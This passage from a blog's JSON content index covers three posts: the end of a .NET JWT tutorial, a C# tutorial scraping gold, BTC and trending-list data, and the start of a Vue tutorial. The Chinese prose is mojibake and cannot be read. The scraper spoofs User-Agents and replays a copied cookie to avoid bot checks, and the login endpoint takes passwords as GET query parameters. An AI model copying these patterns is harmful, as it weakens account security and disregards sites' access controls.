ç¬¬äºŒç§ï¼šä»Headerä¸­çš„Tokenä¿¡æ¯åå‘è§£æå‡ºç”¨æˆ·è´¦å·ä¿¡æ¯ç›´æ¥è¿”å›ï¼Œå½“ç„¶ï¼Œåœ¨å‰é¢åˆ›å»º Tokenæ—¶ï¼Œè¦ä¿å­˜è¿›ä½¿ç”¨åˆ°çš„Claimsä¸­ã€‚ */ return Ok(&quot;æˆæƒé€šè¿‡äº†ï¼&quot;); &#125; &#125;&#125; è°ƒç”¨ â€‹ æ£€æµ‹æ§åˆ¶å™¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657using Microsoft.AspNetCore.Authorization;using Microsoft.AspNetCore.Mvc;using Newtonsoft.Json;using webapijwttest.Models; // For more information on enabling Web API for empty projects, visit https://go.microsoft.com/fwlink/?LinkID=397860 namespace webapijwttest.Controllers&#123; [Route(&quot;api/[controller]&quot;)] [ApiController] public class AuthController : ControllerBase &#123; private ILogger&lt;AuthController&gt; _logger = null; private JwtHelper2 _iJWTService = null; private readonly IConfiguration _configuration; public AuthController(ILogger&lt;AuthController&gt; logger, JwtHelper2 jWTService, IConfiguration configuration) &#123; this._logger = logger; _iJWTService = jWTService; _configuration = configuration; &#125; [Route(&quot;Get&quot;)] [HttpGet] public IEnumerable&lt;int&gt; Get() &#123;//æœªåŠ æˆæƒè®¤è¯ return new List&lt;int&gt;() &#123; 1, 3, 5, 7, 9 &#125;; &#125; [Route(&quot;GetData&quot;)] [HttpGet] [Authorize] public List&lt;object&gt; GetData() &#123;//æ·»åŠ äº†æˆæƒè®¤è¯ï¼Œéœ€è¦ä½¿ç”¨token return new List&lt;object&gt;() &#123; new &#123; userName = &quot;123&quot;, remark = &quot;1234&quot; &#125; &#125;; &#125; [Route(&quot;Login&quot;)] [HttpGet] public string Login(string name, string password) &#123; if (!string.IsNullOrEmpty(name) &amp;&amp; !string.IsNullOrEmpty(password)) &#123; string token = this._iJWTService.CreateToken(name,password); return JsonConvert.SerializeObject(new &#123; result = true, token &#125;); &#125; else &#123; return JsonConvert.SerializeObject(new &#123; result = false, token = &quot;&quot; &#125;); &#125; &#125; &#125;&#125; è°ƒç”¨â€‹ æŠŠtokenæ”¾è¿› â€‹ æµ‹è¯•GetDataâ€‹ å½“è¶…è¿‡æ—¶é—´è°ƒç”¨åˆ™GetDataå¤±è´¥â€‹ ENDğŸŸğŸŸğŸŸ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"JWT","slug":"JWT","permalink":"https://banjinmei.github.io/tags/JWT/"}],"author":"mu"},{"title":".NET spider","slug":"NET-Spider","date":"2024-04-18T04:59:30.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/18/NET-Spider/","permalink":"https://banjinmei.github.io/2024/04/18/NET-Spider/","excerpt":"","text":"å‰è¨€çˆ¬è™«å¯ä»¥ç”¨äºå¤–æ±‡ï¼ŒæœŸè´§ï¼ŒåŸºé‡‘ï¼Œè´§å¸ï¼Œæ¯”åˆ†ï¼Œç”µå•†ï¼Œæ–‡ç« ç­‰ä¿¡æ¯çš„é‡‡é›†ã€‚é€šè¿‡æ•°æ®åˆ†æï¼Œç«å“åˆ†æï¼Œä¸ºå•†ä¸šå†³ç­–æä¾›æ•°æ®æ”¯æŒã€‚ â€‹é‡‘ä»·æš´æ¶¨ï¼ŒæŠ“å–ä¸‹ä»Šæ—¥çš„é‡‘ä»·ã€‚ ğŸ’¡ä½¿ç”¨HttpClientçˆ¬å–æ•°æ®1234567891011121314151617181920try&#123; // åˆ›å»ºHttpClientå®ä¾‹ using (var httpClient = new HttpClient()) &#123; //æ¨¡æ‹ŸUser-Agent httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent()); // å‘é€GETè¯·æ±‚å¹¶è·å–å“åº” xxx.comæ˜¯æŸç½‘ç«™çš„é¡µé¢~ï¼ˆä¿æŠ¤ï¼‰ var response = await httpClient.GetAsync(&quot;https://xxx.com&quot;); response.EnsureSuccessStatusCode(); var htmlContent = await response.Content.ReadAsStringAsync(); &#125;&#125;catch (HttpRequestException ex)&#123; // å¤„ç†è¯·æ±‚å¼‚å¸¸ ViewBag.Error = &quot;Failed to retrieve price data: &quot; + ex.Message;&#125; ğŸš€æ¨¡æ‹ŸUser-Agent1234567891011121314// ç”Ÿæˆéšæœº User-Agentprivate string GetUserAgent()&#123; string[] userAgents = new string[] &#123; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36&quot;, // &#125;; Random random = new Random(); int index = random.Next(userAgents.Length); return userAgents[index];&#125; ğŸ¤µä½¿ç”¨HTMLè§£æåº“ï¼ˆHtmlAgilityPackï¼‰æå–ä»·æ ¼ â€‹ 123456789101112131415161718192021222324252627282930// ä½¿ç”¨HtmlAgilityPackè§£æHTML var htmlDocument = new HtmlDocument(); htmlDocument.LoadHtml(htmlContent); // ä½¿ç”¨XPathè¡¨è¾¾å¼é€‰æ‹©æŒ‡å®šçš„&lt;tr&gt;å…ƒç´  var trElement = htmlDocument.DocumentNode.SelectSingleNode(&quot;//tr[contains(@class, &#x27;border_ea&#x27;) and contains(@class, &#x27;noTop_border&#x27;)]&quot;); if (trElement != null) &#123; // è·å–åŒ…å«ä»·æ ¼çš„&lt;td&gt;å…ƒç´  var priceCell = trElement.SelectSingleNode(&quot;.//td[@align=&#x27;center&#x27;][2]&quot;); if (priceCell != null) &#123; // æå–ä»·æ ¼ string price = priceCell.InnerText.Trim(); // å°†ä»·æ ¼ä¼ é€’ç»™è§†å›¾ ViewBag.Price = price; &#125; else &#123; ViewBag.Error = &quot;Price cell not found in table row.&quot;; &#125; &#125; else &#123; ViewBag.Error = &quot;Table row not found.&quot;; &#125; ä¹Ÿå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼æå– ğŸ‘Œå‰ç«¯Priceæ˜¾ç¤º123&lt;h1&gt;Au99.99 Price: @ViewBag.Price&lt;/h1&gt;&lt;h2&gt;@ViewBag.Error&lt;/h2&gt; ğŸŒ±è¿è¡Œå®ä¾‹ è·å–é‡‘ä»·Auâ€‹ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹è§„åˆ™å–å®æ—¶Ptçš„ä»·æ ¼ 1234567891011121314151617181920212223242526272829303132333435363738// ä½¿ç”¨XPathè¡¨è¾¾å¼é€‰æ‹©æŒ‡å®šçš„&lt;tr&gt;å…ƒç´ var trElements = htmlDocument.DocumentNode.SelectNodes(&quot;//tr[contains(@class, &#x27;border_ea&#x27;) and contains(@class, &#x27;noTop_border &#x27;)]&quot;); if (trElements != null)&#123; foreach (var trElement in trElements) &#123; // è·å–åŒ…å«äº§å“åç§°å’Œä»·æ ¼çš„&lt;td&gt;å…ƒç´  var tdElements = trElement.SelectNodes(&quot;./td&quot;); if (tdElements != null &amp;&amp; tdElements.Count &gt;= 5) &#123; // è·å–äº§å“åç§°ã€æœ€æ–°ä»·ã€æœ€é«˜ä»·ã€æœ€ä½ä»·å’Œä»Šå¼€ç›˜ä»·æ ¼ string productName = tdElements[0].InnerText.Trim(); string latestPrice = tdElements[1].InnerText.Trim(); string highestPrice = tdElements[2].InnerText.Trim(); string lowestPrice = tdElements[3].InnerText.Trim(); string openingPrice = tdElements[4].InnerText.Trim(); // æ£€æŸ¥äº§å“åç§°æ˜¯å¦ä¸ºAu99.99æˆ–Pt99.95 if (productName == &quot;Au99.99&quot;) &#123; // å°†Au99.99ä»·æ ¼ä¿¡æ¯ä¼ é€’ç»™è§†å›¾ ViewBag.AuLatestPrice = latestPrice; ViewBag.AuHighestPrice = highestPrice; ViewBag.AuLowestPrice = lowestPrice; ViewBag.AuOpeningPrice = openingPrice; &#125; else if (productName == &quot;Pt99.95&quot;) &#123; // å°†Pt99.95ä»·æ ¼ä¿¡æ¯ä¼ é€’ç»™è§†å›¾ ViewBag.PtLatestPrice = latestPrice; ViewBag.PtHighestPrice = highestPrice; ViewBag.PtLowestPrice = lowestPrice; ViewBag.PtOpeningPrice = openingPrice; &#125; &#125; &#125;&#125; ç»“æœå¦‚ä¸‹ï¼š â€‹ ğŸ§¾ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è§£æé€šè¿‡httpClientè¯·æ±‚ 123456789101112131415161718192021222324252627282930313233343536373839public async Task&lt;ActionResult&gt; Index()&#123; // è·å–å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³ long timestamp = DateTimeOffset.Now.ToUnixTimeMilliseconds(); // æ„å»ºURL string url = $&quot;http://www.xxx.cn/xx.js?t=&#123;timestamp&#125;&quot;; // åˆ›å»ºHttpClientå®ä¾‹ using (var httpClient = new HttpClient()) &#123; // è®¾ç½® User-Agent httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent()); try &#123; // å‘é€GETè¯·æ±‚ var response = await httpClient.GetAsync(url); response.EnsureSuccessStatusCode(); // è¯»å–è¿”å›çš„æ•°æ® var responseData = await response.Content.ReadAsStringAsync(); // è§£æè¿”å›çš„æ•°æ® var price = ParseGoldPrice(responseData); // å°†ä»·æ ¼ä¼ é€’ç»™è§†å›¾ ViewBag.Price = price; &#125; catch (HttpRequestException ex) &#123; // å¤„ç†è¯·æ±‚å¼‚å¸¸ ViewBag.Error = &quot;Failed to retrieve gold price data.&quot;; &#125; &#125; // è¿”å›è§†å›¾ return View();&#125; å¤„ç†è¿”å›ä»·æ ¼ é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ•°æ® 123456789101112131415161718192021222324252627282930313233343536373839private decimal ParseGoldPrice(string responseData)&#123; string price = &quot;&quot;; decimal price2 = 0; string data = responseData;// // åŒ¹é…ä»·æ ¼çš„æ­£åˆ™è¡¨è¾¾å¼ string pattern = @&quot;var hq_str_gds_AUTD=&quot;&quot;([^&quot;&quot;]+)&quot;&quot;;&quot;; // ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ•°æ® Match match = Regex.Match(data, pattern); if (match.Success) &#123; // è·å–åŒ¹é…åˆ°çš„ä»·æ ¼æ•°æ® string priceData = match.Groups[1].Value; // ä½¿ç”¨é€—å·åˆ†å‰²æ•°æ®ï¼Œå–ç¬¬ä¸€ä¸ªå…ƒç´ ä½œä¸ºä»·æ ¼ string[] priceParts = priceData.Split(&#x27;,&#x27;); price = priceParts[0]; // å°†å­—ç¬¦ä¸²ä»·æ ¼è½¬æ¢ä¸ºdecimalç±»å‹ price2 = decimal.Parse(price); // è¾“å‡ºæå–åˆ°çš„ä»·æ ¼ Console.WriteLine(&quot;Gold Price: &quot; + price2); &#125; else &#123; Console.WriteLine(&quot;Price not found in data.&quot;); &#125; // decimal price = decimal.Parse(priceString); return price2;&#125; â€‹ ğŸ’«è·å–BTCä»·æ ¼Headersæ¨¡æ‹Ÿcookieè·å–BTCä»·æ ¼ 12345678910111213141516171819202122232425262728293031 httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent()); httpClient.DefaultRequestHeaders.Add(&quot;Accept&quot;, &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.9&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Cache-Control&quot;, &quot;max-age=0&quot;);//cookie httpClient.DefaultRequestHeaders.Add(&quot;Cookie&quot;, &quot;__51uvsct__3ExGyQaAoNSqsSUY=1; __51vcke__3ExGyQaAoNSqsSUY=c91184d5-8826-5ea8-8ddc-a0f3b85c9470; __51vuft__3ExGyQaAoNSqsSUY=1713248151570; PHPSESSI328&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Ch-Ua&quot;, &quot;\\&quot;Google Chrome\\&quot;;v=\\&quot;123\\&quot;, \\&quot;Not:A-Brand\\&quot;;v=\\&quot;8\\&quot;, \\&quot;Chromium\\&quot;;v=\\&quot;123\\&quot;&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Ch-Ua-Mobile&quot;, &quot;?0&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Ch-Ua-Platform&quot;, &quot;\\&quot;Windows\\&quot;&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Fetch-Dest&quot;, &quot;document&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Fetch-Mode&quot;, &quot;navigate&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Fetch-Site&quot;, &quot;none&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Sec-Fetch-User&quot;, &quot;?1&quot;); httpClient.DefaultRequestHeaders.Add(&quot;Upgrade-Insecure-Requests&quot;, &quot;1&quot;); //åŒ¹é… var currencyElement = htmlDocument.DocumentNode.SelectSingleNode(&quot;//div[@id=&#x27;hr_app_cid_1&#x27;]&quot;); if (currencyElement != null) &#123; // æŸ¥æ‰¾åŒ…å«äººæ°‘å¸ä»·æ ¼çš„å…ƒç´  var priceElement = currencyElement.SelectSingleNode(&quot;.//div[@class=&#x27;virtual overflow&#x27;]&quot;); if (priceElement != null) &#123; // æå–äººæ°‘å¸ä»·æ ¼ var chinesePrice = priceElement.InnerText.Trim(); &#125; &#125; ç¾å…ƒä»·æ ¼ä¹Ÿæ˜¯ç±»ä¼¼çš„è§„åˆ™ï¼Œè¿è¡Œç»“æœ â€‹ â€‹ âœ¨è·å–CSDNçƒ­ç‚¹â€‹ æ¨¡æ‹Ÿè¯·æ±‚ï¼Œä¿®æ”¹è§„åˆ™ 1234567891011121314151617181920212223242526272829303132333435var httpClient = new HttpClient();var referer = &quot;xxx&quot;;httpClient.DefaultRequestHeaders.Add(&quot;referer&quot;, referer);httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent());var response = await httpClient.GetAsync(&quot;xxx/&quot;);response.EnsureSuccessStatusCode();var responseBody = await response.Content.ReadAsStringAsync(); var contentList = new List&lt;Tuple&lt;string, string, string&gt;&gt;(); var htmlDocument = new HtmlDocument();htmlDocument.LoadHtml(responseBody); // var itemNodes = htmlDocument.DocumentNode.SelectNodes(&quot;//div[contains(@class, &#x27;headswiper-item&#x27;)]&quot;);var items = htmlDocument.DocumentNode.SelectNodes(&quot;//div[@class=&#x27;headswiper-item&#x27;]&quot;); if (items != null)&#123; foreach (var item in items) &#123; var titleNode = item.SelectSingleNode(&quot;.//a[@class=&#x27;title&#x27;]&quot;); var nameNode = item.SelectSingleNode(&quot;.//p[@class=&#x27;name&#x27;]&quot;); var linkNode = item.SelectSingleNode(&quot;.//a[@class=&#x27;title&#x27;]&quot;); if (titleNode != null &amp;&amp; nameNode != null &amp;&amp; linkNode != null) &#123; var title = titleNode.InnerText.Trim(); var name = nameNode.InnerText.Trim(); var link = linkNode.GetAttributeValue(&quot;href&quot;, &quot;&quot;); contentList.Add(new Tuple&lt;string, string, string&gt;(title, name, link)); &#125; &#125;&#125;return View(contentList); or ä½¿ç”¨æ­£åˆ™ 1234567891011121314 // ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ div å…ƒç´ å†…å®¹var regex = new Regex(@&quot;&lt;div class=&quot;&quot;headswiper-item&quot;&quot;(.*?)&lt;/div&gt;&quot;, RegexOptions.Singleline);var matches = regex.Matches(responseBody);foreach (Match match in matches)&#123; //å»é™¤Vuehtml string s1temp = match.Groups[1].Value.Trim(); int i1 = s1temp.IndexOf(&quot;&gt;&quot;)+1; int i2 = s1temp.Length - i1 - 1; string hotstr = s1temp.Substring(i1, i2); contentList.Add(hotstr);&#125; è¿è¡Œç»“æœâ€‹ ğŸƒ è·å–ç¼–ç¨‹è¯­è¨€æ’è¡Œæ¦œ1234567891011var response = await httpClient.GetAsync(&quot;xxx&quot;);response.EnsureSuccessStatusCode();var htmlContent = await response.Content.ReadAsStringAsync(); var htmlDocument = new HtmlDocument();htmlDocument.LoadHtml(htmlContent); // è·å–è¡¨æ ¼å†…å®¹var table = htmlDocument.DocumentNode.SelectSingleNode(&quot;//table[@class=&#x27;w-min min-w-full table-fixed divide-y-2 divide-gray-200 text-sm dark:divide-gray-700&#x27;]&quot;); ViewBag.TableContent = table?.OuterHtml; â€‹ ğŸ–¥ï¸è·å–å°ç ´ç«™çƒ­é—¨1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var httpClient = new HttpClient();var referer = &quot;https://xxx&quot;;httpClient.DefaultRequestHeaders.Add(&quot;Referer&quot;, referer);httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent());var response = await httpClient.GetAsync(&quot;https://xxx&quot;);response.EnsureSuccessStatusCode();var responseBody = await response.Content.ReadAsStringAsync();var jsonRes = Newtonsoft.Json.JsonConvert.DeserializeObject&lt;dynamic&gt;(responseBody);var tempArr = new List&lt;MItem&gt;();int itid = 1;foreach (var itemj in jsonRes.data.list)&#123; string tt = itemj.keyword.ToString(); // string hot = itemj.hot_value.ToString(); tempArr.Add(new MItem &#123; Index = itid++, Title = tt, Hot = &quot;&quot;, Url = &quot;https://search.bilibili.com/all?keyword=&quot; + tt+ &quot;&amp;order=click&quot;, MobileUrl = &quot;https://search.bilibili.com/all?keyword=&quot; + tt+ &quot;&amp;order=click&quot; &#125;);&#125;var md = new MData&#123; Success = true, Title = &quot;å°ç ´ç«™&quot;, Subtitle = &quot;çƒ­æœæ¦œ&quot;, UpdateTime = DateTime.Now.ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;), Data = tempArr&#125;; public class MData &#123; public bool Success &#123; get; set; &#125; public string Title &#123; get; set; &#125; public string Subtitle &#123; get; set; &#125; public string UpdateTime &#123; get; set; &#125; public List&lt;MItem&gt; Data &#123; get; set; &#125; &#125;public class MItem &#123; public int Index &#123; get; set; &#125; public string Title &#123; get; set; &#125; public string Hot &#123; get; set; &#125; public string Url &#123; get; set; &#125; public string MobileUrl &#123; get; set; &#125; &#125; â€‹ â­è·å–æŸéŸ³çƒ­é—¨12345678910111213141516171819202122232425262728293031323334353637var httpClient = new HttpClient();var referer = &quot;xxx&quot;;httpClient.DefaultRequestHeaders.Add(&quot;referer&quot;, referer);httpClient.DefaultRequestHeaders.Add(&quot;User-Agent&quot;, GetUserAgent());var response = await httpClient.GetAsync(&quot;xxx&quot;);response.EnsureSuccessStatusCode();var responseBody = await response.Content.ReadAsStringAsync();var jsonRes = Newtonsoft.Json.JsonConvert.DeserializeObject&lt;dynamic&gt;(responseBody);var tempArr = new List&lt;MItem&gt;(); int itid = 1;foreach (var itemj in jsonRes.word_list)&#123; string tt = itemj.word.ToString(); string hot =itemj.hot_value.ToString(); tempArr.Add(new MItem &#123; Index = itid++, Title = tt, Hot = hot, Url = &quot;https://www.douyin.com/search/&quot; + tt, MobileUrl = &quot;https://www.douyin.com/search/&quot; + tt &#125;); &#125; var douyinData = new MData&#123; Success = true, Title = &quot;æŸéŸ³&quot;, Subtitle = &quot;çƒ­æœæ¦œ&quot;, UpdateTime = DateTime.Now.ToString(&quot;yyyy-MM-dd hh:mm:ss&quot;), Data = tempArr&#125;; â€‹ æ³¨æ„ï¼šå¦‚æœç›®æ ‡æœ‰IPé™åˆ¶ã€Cookieã€ç­¾åç­‰ï¼Œåˆ™éœ€ç¼–å†™ç›¸åº”çš„å¯¹ç­– ã€‚ æ­¤å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡WinFrom WebBowseræ§ä»¶å®ç°åŠ è½½å®ŒDOMå†åŒ¹é…ä¿¡æ¯å®ç°çˆ¬å–æ•ˆæœã€‚ è¿™é‡ŒåªåšæŠ›ç –å¼•ç‰ï¼Œè¯·å‹¿ä½¿ç”¨æ­¤æŠ€æœ¯åšè¿æ³•çš„äº‹æƒ…ï¼ï¼ï¼ğŸ’€ END","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".NET","slug":"NET","permalink":"https://banjinmei.github.io/tags/NET/"}],"author":"mu"},{"title":"vue study","slug":"Vue-Base","date":"2024-04-17T00:59:30.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/04/17/Vue-Base/","permalink":"https://banjinmei.github.io/2024/04/17/Vue-Base/","excerpt":"","text":"å‰è¨€Vue.jsï¼Œè¿™ä¸ªè½»é‡çº§ä¸”çµæ´»çš„JavaScriptæ¡†æ¶ï¼Œå°±åƒä¸€ä½é­”æœ¯å¸ˆï¼Œç”¨å®ƒçš„é­”æ³•æ£’å°†æ•°æ®å’Œè§†å›¾å·§å¦™åœ°è¿æ¥åœ¨ä¸€èµ·ã€‚å½“æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼ŒVue.jså°±åƒå˜é­”æœ¯ä¸€æ ·ï¼Œè®©è§†å›¾è‡ªåŠ¨æ›´æ–°ï¼Œä¸ºå¼€å‘è€…å¸¦æ¥äº†æå¤§çš„ä¾¿åˆ©ã€‚ Vue.jsçš„è¯ç”Ÿï¼Œæºäºä¸€ä½åå«å°¤é›¨æºªçš„å¼€å‘è€…å¯¹å‰ç«¯å¼€å‘çš„çƒ­çˆ±ä¸è¿½æ±‚ã€‚åœ¨Googleå·¥ä½œæœŸé—´ï¼Œä»–å—åˆ°äº†Angularçš„å¯å‘ï¼Œå†³å®šå¼€å‘ä¸€æ¬¾æ›´åŠ è½»é‡ã€çµæ´»çš„æ¡†æ¶ã€‚äºæ˜¯ï¼ŒVue.jsåº”è¿è€Œç”Ÿï¼Œå®ƒçš„åå­—æ¥æºäºâ€œViewâ€çš„ç¼©å†™ï¼Œå¯“æ„ç€å®ƒä¸“æ³¨äºè§†å›¾å±‚çš„å¼€å‘ã€‚Vue.jsä¸æ–­åœ°å®Œå–„å’Œå‘å±•ã€‚å®ƒå¼•å…¥äº†å“åº”å¼æ•°æ®ç»‘å®šã€ç»„ä»¶åŒ–å¼€å‘ç­‰æ ¸å¿ƒæ¦‚å¿µï¼Œè®©å‰ç«¯å¼€å‘å˜å¾—æ›´åŠ é«˜æ•ˆå’Œå¯ç»´æŠ¤ã€‚ ğŸ‘‹ Vueç¯å¢ƒæ­å»ºé¦–å…ˆï¼Œæ­ä¸€ä¸ªæ‰“ä»£ç çš„ç¯å¢ƒ 1.å®‰è£…node.jsåœ¨ä½¿ç”¨VS Codeä¹‹å‰ï¼Œéœ€è¦å®‰è£…Vueçš„å¼€å‘ç¯å¢ƒã€‚ å®‰è£…Vueçš„æœ€ç®€å•æ–¹æ³•æ˜¯ä½¿ç”¨npmåŒ…ç®¡ç†å™¨ï¼Œå…ˆå®‰è£…Node.jså’Œnpmã€‚ nodeå®˜ç½‘ &#x3D;&gt; https://nodejs.org/en/download 2.é…ç½®ç¯å¢ƒå˜é‡åœ¨nodejså®‰è£…ç›®å½•ä¸‹æ–°å»ºnode_cacheï¼ˆnodejsç¼“å­˜ï¼‰ã€node_globalï¼ˆå…¨å±€åŒ…å­˜æ”¾ï¼‰ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ â€‹â€‹ æ‰“å¼€cmdå‘½ä»¤æç¤ºç¬¦ï¼Œé…ç½®æ–‡ä»¶è·¯å¾„å¦‚ä¸‹ï¼š â€‹â€‹ é…ç½®ç¯å¢ƒå˜é‡ â€‹â€‹ ç³»ç»Ÿå±æ€§-&gt;é«˜çº§-&gt;ç¯å¢ƒå˜é‡-&gt;æ–°å¢ç¯å¢ƒå˜é‡ï¼šâ€‹â€‹ ç³»ç»Ÿå˜é‡â€‹â€‹ â€‹â€‹ 3.VSCodeé…ç½® Visual Studio Code ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡ŒVSCode VSCodeå®‰è£…æ’ä»¶ESLint å®‰è£…jsæ‰“åŒ…å·¥å…· 12npm install -g webpack â€‹â€‹ â€‹â€‹ 4.å®‰è£…Vue CLI1234npm install -g vue-cli(vue-cli npm install @vue/cli -g --unsafe-perm) 5.åœ¨VS Codeä¸­æ‰“å¼€Vueé¡¹ç›®5.1. åœ¨VS Codeä¸­ï¼ŒFile &gt; Open Folderâ€¦ é€‰æ‹©â€œæ–‡ä»¶â€&gt; â€œæ‰“å¼€æ–‡ä»¶å¤¹â€ã€‚â€‹â€‹ 5.2. æ‰¾åˆ°Vueé¡¹ç›®æ–‡ä»¶å¤¹ï¼Œé€‰æ‹©â€œæ–‡ä»¶å¤¹â€å¹¶æ‰“å¼€ã€‚â€‹â€‹ å¯ä»¥æ ¹æ®éœ€è¦ï¼Œåœ¨Extensionså®‰è£…VSCodeçš„ä¸­æ–‡æ‰©å±•ã€‚ 5.3ä¹Ÿå¯ä»¥é€šè¿‡Vue UI åˆ›å»ºä¸€ä¸ªæ–°çš„Vueé¡¹ç›®ç„¶åæ‰“å¼€12vue ui â€‹â€‹ â€‹â€‹ 6.è¿è¡ŒVueé¡¹ç›®åœ¨VS Codeä¸­æ‰“å¼€ Terminal ç»ˆç«¯ï¼Œåˆ‡æ¢åˆ°Vueé¡¹ç›®æ–‡ä»¶å¤¹ï¼Œç„¶åè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š 12npm install â€‹â€‹ 1install --å®Œä¼šæœ‰node_modules 12npm run dev â€‹â€‹ 1npm run serve 123npm run build â€‹â€‹ ç”Ÿæˆæ‰“åŒ…å®Œä¼šæœ‰distæ–‡ä»¶å¤¹æ”¾ç€æ‰“åŒ…å¥½çš„æ–‡ä»¶ å¯ç›´æ¥æ”¾åˆ°æœåŠ¡å™¨ä¸Šè¿è¡Œ å¦å¤–ï¼Œä¹Ÿå¯é€šè¿‡ HBuilder æ¥æ•²ä»£ç â€‹â€‹ å†…ç½®æµè§ˆå™¨ ğŸ‘€ VueåŸºç¡€å­¦ä¹ 1.å¼•å…¥vue.js 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;script src=&quot;vue.js&quot; type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt; &lt;div id=&quot;app&quot;&gt; &#123;&#123; message &#125;&#125; &#123;&#123;name&#125;&#125; &#123;&#123;himan&#125;&#125; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var app = new Vue(&#123; el: &#x27;#app&#x27;, data: &#123; message: &#x27;Hello Vue!&#x27;, name : &quot;Vue&quot;, himan:&quot;hhhhhhh&quot; &#125; &#125;); &lt;/script&gt;â€‹```â€‹â€‹&lt;img onerror=&quot;notfound(this);&quot; src=&quot;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041746.jpg&quot; &gt;## 2.æ•°æ®æ–¹æ³• ``` javascript&lt;div id=&quot;app&quot;&gt; &#123;&#123;a&#125;&#125;&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt;var data = &#123; a : 1 &#125;;var vm = new Vue(&#123; el : &quot;#app&quot;, data : data&#125;); //data.a = 121212 vm.$watch(&#x27;a&#x27;, function(newVal, oldVal)&#123; console.log(newVal, oldVal);&#125;) vm.$data.a = &quot;123123.&quot; &lt;/script&gt; â€‹ 3.ç”Ÿå‘½å‘¨æœŸæ¯ä¸ª Vue ç»„ä»¶å®ä¾‹åœ¨åˆ›å»ºæ—¶éƒ½éœ€è¦ç»å†ä¸€ç³»åˆ—çš„åˆå§‹åŒ–æ­¥éª¤ï¼Œæ¯”å¦‚è®¾ç½®å¥½æ•°æ®ä¾¦å¬ï¼Œç¼–è¯‘æ¨¡æ¿ï¼ŒæŒ‚è½½å®ä¾‹åˆ° DOMï¼Œä»¥åŠåœ¨æ•°æ®æ”¹å˜æ—¶æ›´æ–° DOMã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œå®ƒä¹Ÿä¼šè¿è¡Œè¢«ç§°ä¸ºç”Ÿå‘½å‘¨æœŸé’©å­çš„å‡½æ•°ï¼Œè®©å¼€å‘è€…æœ‰æœºä¼šåœ¨ç‰¹å®šé˜¶æ®µè¿è¡Œè‡ªå·±çš„ä»£ç ã€‚ befroreCreate åœ¨å®ä¾‹åˆå§‹åŒ–ä¹‹å æ•°æ®è§‚æµ‹ (data observer) å’Œ event&#x2F;watcher äº‹ä»¶é…ç½®ä¹‹å‰è¢«è°ƒç”¨ã€‚ created åœ¨å®ä¾‹åˆ›å»ºå®Œæˆåè¢«ç«‹å³è°ƒç”¨ã€‚ åœ¨è¿™ä¸€æ­¥ï¼Œå®ä¾‹å·²å®Œæˆä»¥ä¸‹çš„é…ç½®ï¼šæ•°æ®è§‚æµ‹ (data observer)ï¼Œå±æ€§å’Œæ–¹æ³•çš„è¿ç®—ï¼Œwatch&#x2F;event äº‹ä»¶å›è°ƒã€‚ ç„¶è€Œï¼ŒæŒ‚è½½é˜¶æ®µè¿˜æ²¡å¼€å§‹ï¼Œ$el å±æ€§ç›®å‰ä¸å¯è§ã€‚ beforeMount åœ¨æŒ‚è½½å¼€å§‹ä¹‹å‰è¢«è°ƒç”¨ ç›¸å…³çš„æ¸²æŸ“å‡½æ•°é¦–æ¬¡è¢«è°ƒç”¨ mounted åœ¨ç»„ä»¶è¢«æŒ‚è½½ä¹‹åè°ƒç”¨ beforeUpdate 